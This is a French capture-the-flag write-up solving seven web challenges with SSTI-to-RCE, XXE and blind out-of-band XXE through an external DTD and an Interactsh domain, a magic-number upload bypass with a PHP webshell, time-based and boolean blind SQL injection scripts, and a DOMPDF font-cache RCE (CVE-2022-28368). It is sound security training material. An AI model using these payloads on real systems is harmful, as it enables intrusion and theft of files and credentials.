## Chall 1

L’application affiche une bannière “Hello guest” et un champ texte permettant d’envoyer un paramètre GET `username`

Injection de la payload :
```
{{7*7}}
```

![[IMG-20251202152530398.png]]

Cela signifie que la chaîne `{{7*7}}` a été **interprétée** par le backend et non affichée telle quelle -> SSTI
Le nom du challenge est **“Serpent”**, ce qui suggère fortement un backend en **Python** qui utilise certainement un framework Flask.

Je recherche donc une payload qui me permet d'avoir une RCE pour una app Flask vulnérable au SSTI et je trouve ça:

![[IMG-20251202161148281.png]]

Payload:
```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Je test et valide la payload:

![[IMG-20251202161043032.png]]

J'affiche les fichiers présent dans le repertoire de l'app:

![[IMG-20251202161921671.png]]

Je trouve le flag et l'affiche:

![[IMG-20251202161952789.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/j418w8w9cep09bc559jm427jare4aiz9-end.html}
```

## Chall 2

À l’ouverture du challenge, on découvre une interface très simple : une unique zone de texte permettant d’envoyer un message au serveur.


![[IMG-20251202194419296.png]]

Pour comprendre ce que l’application envoie réellement au serveur, j’intercepte la requête avec **Burp Suite**.  
On observe immédiatement que le formulaire n’envoie pas simplement la chaîne saisie par l’utilisateur :  
le champ `message` est intégré dans un **document XML complet**, puis **encodé en Base64** avant d’être transmis.

![[IMG-20251202194519522.png]]

En explorant le code JavaScript du site (`main.js`), on trouve la logique complète utilisée pour construire la requête POST.  
Ce code est important pour comprendre comment l’application traite l’entrée utilisateur.

![[IMG-20251202194539440.png]]

En analysant le code JavaScript, je comprends que l’application envoie en réalité un **document XML complet** via un POST.  
Ce XML est généré côté client, inséré dans la variable `xml_payload`, puis **encodé en Base64** grâce à la fonction `btoa()` avant d’être transmis au serveur.

Comme le serveur décode ce Base64 et exécute ensuite un `simplexml_load_string()`, il parse donc **un XML entièrement contrôlable par l’utilisateur**.  
À ce stade, une idée me vient immédiatement : cela ressemble fortement à une vulnérabilité de type **XXE (XML eXternal Entity)**.

Pour tester l’hypothèse, je construis un XML contenant :
1. une déclaration `DOCTYPE`,
2. une entité externe `xxe` pointant vers `/flag`,
3. et l’appel de cette entité dans la balise `<message>`.

Voici la payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE document [
  <!ENTITY xxe SYSTEM "file:///flag">
]>
<document>
  <message>&xxe;</message>
</document>
```

- **`file:///flag`**  
    indique au parser XML de charger le contenu du fichier `/flag` présent sur le serveur (indice dans le code source main.js).
- **`<!ENTITY xxe SYSTEM "...">`**  
    définit une entité externe, donc une ressource dont le contenu sera récupéré lors du parsing XML.
- **`&xxe;`**  
    est remplacé **dynamiquement**, au moment du parsing, par le contenu du fichier chargé via `file:///`.

J'encode ensuite ma payload en base 64 en pensant à encoder les caractères spéciaux aussi pour m’assurer qu’aucun caractère réservé (`+`, `=`, `/`, etc.) ne sera modifié lors de l’envoi en POST.

![[IMG-20251202201955467.png]]

Cela me donne la chaîne que je devrai injecter dans le paramètre `xml=` lors de l’attaque. Ainsi, le serveur recevra un flux identique à celui qu’envoie le front-end, mais contenant ma propre structure XML exploitant la vulnérabilité XXE.

![[IMG-20251202202014666.png]]

Cela me permet d'obtenir le flag du deuxième challenge:

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/abhnjlma6g0p1jeaw0yg3ekytvv4lb3o-end.html}
```


## Chall 3

Dans ce challenge, on dispose d’une fonctionnalité permettant de **mettre à jour sa photo de profil** en uploadant un fichier.  
J’ai donc commencé par tester un fichier arbitraire, avec différentes extensions, pour observer le comportement du serveur.

Très rapidement, je constate que **peu importe l’extension du fichier que j’essaie d’ajouter (.txt, .php, .jpg, etc.)**, l’application renvoie une erreur indiquant que **le type de fichier est incorrect**.  
Cela suggère fortement que le serveur ne se base pas uniquement sur l’extension, mais réalise un contrôle plus strict : **une vérification du “magic number” du fichier**.

Les magic numbers correspondent aux premiers octets d’un fichier, utilisés pour identifier son format réel.  
Par exemple, pour le format PNG :

![[IMG-20251202232830158.png]]

Ainsi, même si je renomme un fichier en `.png`, si son contenu ne commence pas par `89 50 4E 47`, l’application le rejettera.

Ce comportement indique donc que pour bypasser la vérification et uploader un fichier malveillant, je dois **fabriquer un fichier contenant un magic number valide**, puis y insérer du code arbitraire derrière.

Pour contourner la vérification du type de fichier réalisée côté serveur, j’ai créé un fichier dont les **premiers octets correspondent à la signature d’un vrai fichier PNG**

![[IMG-20251202233926481.png]]

- `89504E47` → signature hexadécimale du format PNG
- `xxd -r -p` → convertit l’hex en données binaires
- `poc.php` → fichier final (extension PHP pour la suite du bypass)

Une fois mon fichier forgé avec un magic number PNG valide, je procède à l’upload.  
Cette fois-ci, **le fichier passe la vérification du serveur** et l’application affiche un message confirmant que la photo de profil a été mise à jour.

J’ouvre alors **Burp Suite** pour observer ce qui se passe après l’envoi du formulaire.  
En interceptant la requête et le trafic suivant, je remarque immédiatement qu’une requête GET est effectuée automatiquement vers :

```
/uploads/profile-picture.php
```

![[IMG-20251202234205659.png]]

Lorsque j’accède directement au fichier que j’ai uploadé, je constate que le navigateur affiche bien le début du fichier, incluant le magic number PNG:

![[IMG-20251202234823095.png]]

Juste après cette signature, tout le contenu est interprété comme du PHP par le serveur.  
Je décide donc d’y injecter un webshell minimaliste à la suite du magic number, afin d’exécuter des commandes arbitraires :

![[IMG-20251202234844788.png]]
Ce fichier est toujours accepté comme une image par le mécanisme de vérification (grâce au magic number), mais **le serveur continue de l’exécuter comme un script PHP**, car son extension reste `.php`.
Une fois uploadé, on obtient le flag dans /uploads/profile-picture.php

![[IMG-20251202234944708.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/rigfw8y3wyo257buunoro1w1kb3g0968-end.html}
```
## Chall 4

Après authentification, l’application redirige l’utilisateur vers une page affichant une liste d’articles.  
Lorsqu’un article est sélectionné, le navigateur envoie la requête suivante :

```html
GET /api/posts/<id-post>?<timestamp> HTTP/2
```
Ici, `<id-post>` représente l’identifiant numérique de l’article.
La réponse associe bien l’ID à un contenu retourner sous format JSON :
![[Pasted image 20251204234022.png]]
Cela indique  que l’API récupère l’article correspondant depuis la base de données en fonction de l’ID fourni dans l’URL.
Pour tester la robustesse du paramètre, on remplace l’ID numérique par une chaîne arbitraire :

```
GET /api/posts/test?1764887814058 HTTP/2
```

![[Pasted image 20251204174836.png]]

Dans Burp Suite, on observe une erreur renvoyée par le serveur.  Elle **provient directement du moteur MySQL**, et révèle plusieurs éléments importants :
- l’application insère la valeur située après `/posts/` **directement dans une requête SQL**,
- sans validation ni échappement correct,
- en l’interprétant comme un champ ou une condition SQL.

Pour vérifier que la valeur injectée est bien interprétée dans la requête SQL, j’envoie la payload suivante :

```sql
1 OR SLEEP(5)
```

J’observe alors que la réponse met systématiquement cinq secondes à revenir, ce qui confirme que le paramètre est effectivement injecté dans la requête SQL et que la vulnérabilité SQLi est exploitable.
J’essaye ensuite d’envoyer une payload permettant de contourner totalement la condition du `WHERE` afin de récupérer l’intégralité des enregistrements :

```sql
1 OR 1=1--
```

Cependant, malgré une injection syntaxiquement correcte, la réponse retournée par l’API reste strictement identique :

```json
{
    "id": 1,
    "username": "admin",
    "title": "First",
    "content": "I like to be the first one to post comment"
}

```

Aucune donnée supplémentaire n’apparaît, ce qui indique que, même si la requête SQL est bien modifiée, l’application n’affiche qu’un seul enregistrement dans sa réponse.
Cependant, puisque la requête ne renvoie pas d’erreur, cela signifie que l’injection est bien exécutée par le serveur, même si le résultat n’est pas affiché.  
Je décide donc de tirer parti de ce comportement pour tenter d’extraire des informations sur la base de données.
Comme première étape, j’essaie de vérifier si une table nommée `users` existe dans le schéma actuel.  
Pour cela, j’envoie la payload suivante :

```sql
1 UNION SELECT username,password FROM users--
```

J'obtiens cette erreur remonté par le server:

![[Pasted image 20251204235633.png]]

Cela confirme que la table `users` n’existe pas dans la base de données.  
Je poursuis donc mes tests en ciblant une table potentiellement nommée `user`.  
Cette fois, le serveur n’émet aucune erreur, ce qui laisse supposer que la table existe bien.

À partir de là, je peux utiliser des injections conditionnelles basées sur la fonction `SLEEP(0.2)` afin d’inférer des informations sur la base de données.  
Le principe est simple : si la condition que je teste est vraie, MySQL exécute `SLEEP(0.2)` et la réponse du serveur est retardée. Si elle est fausse, la requête s’exécute normalement et la réponse arrive immédiatement.  
Cette différence de temps me permet donc de déterminer, sans jamais voir directement le résultat SQL, si une condition est vérifiée ou non.
Grâce à ce mécanisme, je peux confirmer la présence de l’utilisateur `admin`, récupérer la longueur de son mot de passe, puis en extraire le hash caractère par caractère.

- Cette requête me permet de vérifier que l’entrée “admin” est bien présente dans la table.
```sql
1 OR IF((SELECT COUNT(*) FROM user WHERE username='admin')>0, SLEEP(0.2), 0)
```

- Ici, je confirme que le mot de passe associé à l’utilisateur admin comporte 32 caractères.
```sql
1 OR IF((SELECT LENGTH(password) FROM user WHERE username='admin')=32, SLEEP(0.2), 0)
```

- Enfin, je créé une requête qui me permet de récupérer un caractère précis du mot de passe.
```sql
1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),1,1)='a', SLEEP(0.2), 0)
```

En répétant l’opération pour chaque position et pour chaque caractère possible, il devient alors possible d’exfiltrer l’intégralité du hash associé à l’utilisateur admin. Cette étape étant trop longue à faire à la main , je décide de créer un script python pour trouver le mot de passe:
```python
import requests
import time

url = "https://k5et0n88lteob5nq0fyte1ajpfd79g3m-2025-12-02-tdu3-b60612.wannatry.fr/api/posts/"
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJpYXQiOjE3NjQ4NjQ4NDd9.YQarMCZiOnLh6ToX8uCGAARbxinhwE4H1SR3hdfaFMc"
headers = {"Authorization": token}

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!"
length = 32
result = ""

for i in range(1, length + 1):
    for c in chars:
        payload = f"1 OR IF(SUBSTRING((SELECT password FROM user WHERE username='admin'),{i},1)='{c}',SLEEP(0.2),0)"
        t0 = time.time()
        requests.get(url + payload, headers=headers)
        if time.time() - t0 > 0.2:
            result += c
            print(result)
            break

print("password:", result)
```

Après execution du script, j'obtiens ce résultat:
![[Pasted image 20251205000419.png]]

Le mot de passe récupéré est un hash MD5. Je le met dans crackstation et récupère le mot de passe admin associé:

![[Pasted image 20251204180730.png]]
yerramshettysumlok
Enfin je me connect entant qu'admin au site, et j'accède au flag:

![[Pasted image 20251204180802.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/mwex0emeea7ycbs4pwjim2k1jrof6utu-end.html}
```

## Chall 5

Ce challenge reprend une structure très similaire au **challenge numéro 4**, mais cette fois-ci l’exploitation est plus complexe et nécessite l’utilisation d’une technique d’exfiltration hors-bande (_Out-Of-Band_).

Comme pour le 4ème challenge, on observe un formulaire qui envoie en arrière-plan une requête contenant un champ nommé `xml`, dont la valeur est tout simplement une chaîne **encodée en Base64** représentant un document XML.
En réinjectant du XML contrôlé par l’utilisateur, il est possible d'ajouter une déclaration `<!DOCTYPE>` afin de définir des **entités externes**. 
Cependant, contrairement à l’exercice précédent, **le serveur ne renvoie jamais le contenu résolu des entités dans la réponse HTTP**.  
Ainsi, même en tentant d’inclure une ressource locale comme `file:///flag`, aucune donnée utile n’est affichée côté client.
Cela signifie que nous sommes face à une **XXE Blind**, c’est-à-dire que l’on peut forcer le serveur à lire des fichiers, mais **on ne peut pas voir directement le contenu dans la réponse HTTP**.
Je cherche donc des exploits associé à cette vulnérabilité et je trouve cette exploit sur le site de PortSwigger. 
![[IMG-20251205031810382.png]]

Pour exploiter cette vulnérabilité, on utilise une technique de **Blind XXE Out-Of-Band**, car le serveur ne renvoie jamais le contenu du fichier demandé.  
Il accepte cependant de charger des **DTD externes**, ce qui permet d’exécuter du XML plus complexe.
On commence par créer un fichier `.dtd` contenant la _vraie_ payload XXE : lecture du fichier `/flag` et exfiltration de son contenu vers un server qu'on contôle.
On ne peut **pas** envoyer cette payload directement via le champ `xml` du formulaire car le parseur PHP interdit les paramètres internes contenant des `%`, ce qui provoquait immédiatement des erreurs (`PEReferences forbidden`, `entity not defined`, etc.).
Ensuite j'envoie dans le champ XML une payload qui charge la DTD hébergée et exécute ce qu’elle contient. Ainsi, le fichier `/flag` est lu et envoyé vers mon server en arrière-plan grâce à la DTD.
Pour recevoir le contenu exfiltré, j’aurais pu ouvrir un port sur ma box et configurer un port-forwarding vers un serveur local, mais cela demande une configuration réseau inutilement complexe.  Pour simplifier, j’ai utilisé **Interactsh**, un service conçu pour capturer des requêtes sans aucune configuration : il fournit un domaine unique et enregistre automatiquement toutes les connexions entrantes.  
En plaçant ce domaine dans ma DTD malveillante, le serveur vulnérable envoie directement le contenu du fichier `/flag` vers Interactsh, ce qui me permet de le récupérer même en situation de Blind XXE.

Avant d’exploiter la vulnérabilité, il fallait d’abord vérifier que le serveur hébergeant l’application pouvait effectuer des connexions sortantes. Pour cela, j’envoie une première payload XXE très simple, dont le seul objectif est de forcer le serveur à effectuer une requête vers mon domaine Interactsh :
```xml
<!DOCTYPE xxe [
  <!ENTITY test SYSTEM "http://azxtrmtedzbcsenavtvoj2xgzxir184d7.oast.fun/">
]>
<doc>&test;</doc>
```

On peut observer sur Interactsh qu'une connexion a bien été établie depuis le server, donc l'exploit expliqué avant peut être mise en place.
![[IMG-20251206003812552.png]]

Je crée ensuite mon fichier DTD malveillant, contenant la véritable payload XXE, puis je décide de l’héberger sur le site _paste.c-net.org_.  
Ce service permet d’héberger un fichier texte publiquement, accessible via une URL directe, sans restrictions particulières et sans nécessiter de configuration serveur. 

![[IMG-20251205033822725.png]]

Je crée ensuite la payload XML qui va charger automatiquement la DTD hébergée à l’URL ci-dessus:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM
"https://paste.c-net.org/WenchBusted"> %xxe;]>
<doc>&xxe;
```

Une fois chargée, c’est **la DTD elle-même** qui effectue toute l’exfiltration du fichier `/flag`.
J'encode ma payload en base64 et l'envoie dans le champ XML:
![[IMG-20251205034011844.png]]

On observe que une fois la DTD chargée, le serveur tente de construire l’URL d’exfiltration contenant directement le contenu du fichier `/flag`. Le problème est que le flag inclut des caractères spéciaux (`{`, `}`, `/`, etc.) qui rendent l’URL générée invalide aux yeux du parseur XML de PHP. Lorsqu’il essaie d’interpréter cette URI malformée, `simplexml_load_string()` déclenche une erreur et affiche l’URL fautive dans le message d’erreur. Comme cette URL contient le flag en clair dans ses paramètres, celui-ci apparaît directement dans la réponse HTTP.  
Dans un scénario réel, ou pour obtenir une exfiltration propre dans Interactsh, il aurait fallu encoder le contenu récupéré (par exemple en Base64 via `php://filter/convert.base64-encode/resource=/flag`) afin d’éviter que les caractères spéciaux ne cassent la construction de l’URL. Cela permettrait de transmettre le flag silencieusement, sans générer d’erreur côté serveur.  
Cependant, pour ce challenge, cette erreur nous a été utile : elle confirme que l’attaque XXE fonctionne, que la DTD externe est bien interprétée, et qu’elle permet effectivement de lire le fichier `/flag`. Le flag est donc récupéré malgré l’erreur, ce qui suffit à valider complètement l’exploitation.

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/qk7gi3xb2a3rzsx9edxylqczm4xvq9xm-end.html}
```

## Chall 6

L’interface du challenge propose uniquement une page de connexion.  
Aucune fonctionnalité additionnelle (inscription, posts, dashboard…) n’est réellement opérationnelle côté serveur.  
Le seul point d’entrée exploitable est l’API suivante :

```
POST /api/authenticate
```

Cette API reçoit un couple _username/password_ au format JSON, et renvoie une réponse indiquant si l'utilisateur est authentifié ou non.

Lors de tests initiaux, l’envoi d’un couple de valeurs arbitraires déclenche systématiquement le message :

```
{"error": true, "message": "Invalid credentials"}
```

Afin d’évaluer la robustesse du paramètre _username_, J'ai testé la requête suivante :
![[IMG-20251205221651925.png]]

Le serveur renvoie cette fois une authentification **réussie**, indiquant clairement que l’expression transmise dans `username` a interrompu la requête SQL -> SQLi. 
Aucune erreur n’est remontée lorsque la requête injectée casse la structure SQL côté serveur. L’application ne fournit qu’une réponse binaire (“error”: true/false), ce qui indique clairement qu’il s’agit d’une **injection SQL en mode blind booléen**, où la seule information exploitable pour orienter les tests est l’état de réussite ou d’échec de l’authentification.

Une fois connecté sur la dashboard j'aperçois ce message:
![[IMG-20251205231633285.png]]
Je comprends alors que le but de ce challenge va être de récupérer le contenu des articles pour trouver le flag en utilisant la SQLi blind.

Dans un premier temps, l’objectif est de déterminer dans quelle table de la base de données sont stockés les différents articles.  
Pour cela, une requête SQL injectée de type **UNION SELECT** est utilisée afin de tester l’existence d’une table suspectée.
La payload suivante est envoyée dans le champ _username_ :
![[IMG-20251205221937938.png]]

La réponse obtenue confirme que la table **`post`** existe bien dans la base de données : en effet, la requête injectée ne génère aucune erreur et l’API retourne un message _« Logged in »_.

L’objectif à présent de déterminer **le nom  de deux colonnes dans la tables post qui pourraient nous servir pour la SQLi blind**. Je teste donc plusieurs couples possible et trouve deux champ évident pour une table de ce genre: {id, content}

![[IMG-20251205221625977.png]]
Le serveur renvoyant une réponse **“Logged in”** lorsque j’utilise les colonnes `id` et `content` dans l’injection SQL, je peux désormais construire une payload permettant d’extraire le contenu de chaque article de manière ciblée.
Pour effectuer cette extraction, j’utilise une requête SQL booléenne basée sur la fonction `substr()` afin de tester le contenu **caractère par caractère** :

```sql
' OR (SELECT substr(content,1,1) FROM post WHERE id=<id-article>)='<caractere-testé>' -- 
```

- `substr(content,1,1)` : extrait le premier caractère du champ `content`.  J’incrémente ensuite la position pour parcourir l’intégralité du texte.
- `FROM post WHERE id=<id>` : me permet de cibler l’article voulu.
- `='<caractere>'` : compare le caractère extrait à celui que je teste.
- Si la condition est vraie → la requête renvoie un résultat → le serveur répond **“Logged in”**.
- Si elle est fausse → la requête ne renvoie rien → le serveur renvoie `"error": true`.

Etant difficile et long de testé tous les caractères de chaque article à la main, je décide de créer un script pour le faire automatiquement:

```python
import requests

url = "https://9iunt92zjij47u856z1jme0uy5974ar2-2025-12-02-tdu3-b60612.wannatry.fr/api/authenticate"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_-=!?.:;,+/()[]<>@#&%*$ "
result = ""
i = 1

while True:
    found = False
    for c in chars:
        payload = {
            "username": f"' OR (SELECT substr(content,{i},1) FROM post WHERE id=5)='{c}' -- ",
            "password": "x"
        }

        r = requests.post(url, json=payload)
        j = r.json()

        if j.get("error") == False:
            result += c
            print(f"{result}")
            found = True
            break


    i += 1
```

J’ai ensuite exécuté mon script sur chaque article en modifiant simplement l’ID ciblé.  
Les premiers articles ne contenaient rien d’utile, mais lors de l’extraction du contenu de **l’article 5**, le script a révélé le message :
![[IMG-20251205232138373.png]]
En laissant le script tourner, j’ai obtenu l’intégralité du flag:
```
flag{http://home-2025-12-02-tdu3-b60612.wannatry.fr/3nwhe9e1bdq7lc7uqueo4kmcasizwvuw-end.html}   
```

## Chall 7

En observant le site du challenge, on remarque la présence d’un formulaire permettant de générer un PDF à partir de quatre champs : **nom**, **prénom**, **date de naissance** et **commentaires**.  
Avant de tester des attaques côté serveur, il est pertinent d’inspecter le **code source client**, à la recherche de commentaires oubliés, de fonctionnalités internes ou d’indices laissés par les développeurs.

En consultant le JavaScript embarqué dans la page, on tombe sur une fonction inhabituelle : **`getJob()`**.
La fonction semble volontairement **obfusquée**.
En l’exécutant localement via Node.js :
![[IMG-20251206135000254.png]]
On obtient:
```
https://www.xmco.fr/rejoindre-xmco/
```
Il s’agit  d’un **easter-egg** laissé par le développeur du chalenge :) 

En examinant le code JavaScript présent sur la page principale, on observe une autre fonction entièrement commentée :

![[IMG-20251206140411778.png]]

Plusieurs éléments importants apparaissent ici.
La fonction réalise une requête vers :
```
generate_pdf.php?remote
```
Ce paramètre n’est renseigné nulle part ailleurs dans l’application.  
Il s’agit donc très probablement d’un mécanisme interne utilisé par les développeurs. De plus, le commentaire indique clairement que cette fonction n'aurait pas dû être présente dans l’environnement de production. Cela suggère que la requête POST pour créer un PDF peut avoir un autre type de sortie lorsqu’elle est executé avec le paramètre `remote`.
J'intercepte donc avec burpsuite la requête POST et ajoute le paramètre remote:
![[IMG-20251206140425794.png]]
On observe une différence dans la réponse. En effet, un nouveau Header est présent: 
![[IMG-20251206140436308.png]]
Cela indique que DOMPDF est configuré pour autoriser le chargement de ressources externes (polices, CSS…).  
On remarque également la version du moteur PDF :
![[IMG-20251206140401059.png]]
Cette version est importante : DOMPDF 1.2.0 est affecté par une vulnérabilité critique permettant une **Remote Code Execution** via le mécanisme d’import de polices distantes (CVE-2022-28368).
DOMPDF peut télécharger une police indiquée dans un fichier CSS, puis la met en cache dans `/lib/fonts/<fontname>_normal_<hash>.php`.
Le fichier est ensuite interprété par PHP si son extension est `.php`.  Ainsi, en fournissant une fausse police contenant du code PHP valide, il est possible de créer un fichier malveillant dans ce répertoire et de l’exécuter directement depuis le serveur.
Pour réaliser cette exploit, je me suis aidé de cet article:
https://www.optiv.com/insights/discover/blog/exploiting-rce-vulnerability-dompdf
Il explique en détail comment DOMPDF gère les polices distantes, comment elles sont mises en cache sous la forme de fichiers `.php`, et comment détourner ce mécanisme pour exécuter du code sur la machine cible.

Pour mener à bien cet exploit, il faut exposer deux fichiers accessibles depuis l’extérieur, que DOMPDF pourra récupérer grâce au paramètre `remote` ajouté dans la requête. Pour éviter d’ouvrir un port sur ma box et de mettre en place un serveur local accessible depuis Internet, j’ai choisi de créer une petite application web sur **PythonAnywhere**.

Cette plateforme me fournit directement un nom de domaine public, ce qui me permet d’héberger mes fichiers malveillants et de laisser DOMPDF les télécharger sans difficulté.

![[IMG-20251206210527505.png]]

J’y dépose donc deux fichiers essentiels à l’exploitation :
- **style.css**, qui charge automatiquement la police distante ;
- **exploit.php**, une version polyglotte servant à la fois de police TTF valide _et_ de payload PHP.

Création de `exploit.php`:
DOMPDF n’acceptera de télécharger le fichier que s’il ressemble réellement à un fichier `.ttf`.
Un TTF commence toujours par l’en-tête suivant :`\x00\x01\x00\x00\x00\x10\x00\x80`
Je l’ajoute donc en première ligne, puis j’insère ma payload PHP :

```
\x00\x01\x00\x00\x00\x10\x00\x80 
<?php system($_GET['cmd']); ?>
```

Création de `style.css`:
Ce fichier CSS indique à DOMPDF de récupérer ma “fausse police” exploit.php.  
C’est suffisant pour que le fichier soit téléchargé puis mis en cache côté serveur.
```css
@font-face {
    font-family: 'exploit';
    src: url('https://theoctf.pythonanywhere.com/static/test4.php');
    font-weight: normal;
    font-style: normal;
}

body {
    font-family: 'exploit';
}
```

A présent je génère le PDF avec le paramètre `remote`:
![[IMG-20251206184116463.png]]
Dans le champ _commentaires_, j’injecte une balise `<style>` qui force DOMPDF à charger mon fichier `style.css`.
Une fois la génération du PDF déclenchée avec le paramètre `remote`, DOMPDF télécharge automatiquement ces deux fichiers depuis mon serveur. Le polyglotte est alors stocké dans la bibliothèque interne des police mais avec l’extension `.php`.  
On peut également confirmer dans les logs de mon serveur que la machine du challenge est bien venue télécharger `style.css`, puis le fichier `exploit.php`:
![[IMG-20251206225026943.png]]

À partir de là, l'exploit est en place, il ne reste plus qu’à retrouver le nom sous lequel DOMPDF a enregistré notre “police” et exécuter du code via `?cmd=`.
Pour cela, la réponse renvoyée par BurpSuite est très utile. On y voit clairement comment le fichier a été enregistré dans le dossier des polices :
![[IMG-20251206225913305.png]]
DOMPDF génère toujours ce type de nom en suivant le schéma :
```
<fontname>_normal_<md5 du contenu>
```

Pour accéder à notre fichier une fois qu’il a été enregistré par le serveur, il faut déterminer dans quel dossier DOMPDF l’a rangé. En cherchant un peu, on découvre que les polices générées se retrouvent habituellement dans /dompdf/lib/fonts/. Cependant, un indice présent sur la page permet de connaitre le vrai chemin vers le fichier .php.
![[IMG-20251206185412714.png]]
On en déduit donc que notre fichier est accessible via : /librairies/dompdf/lib/fonts/exploit_normal_5e368b03ec49ffe9e308dfca4b8caec6.php.

On a ainsi accès à un web shell direct qui nous permet de retrouver le flag sur le server:
![[IMG-20251206185246929.png]]

```
FLAG{http://home-2025-12-02-tdu3-b60612.wannatry.fr/c2w8i3ydokm6de4x92dogxfwnr9sa1lx-end.html}
```

## Chall 8

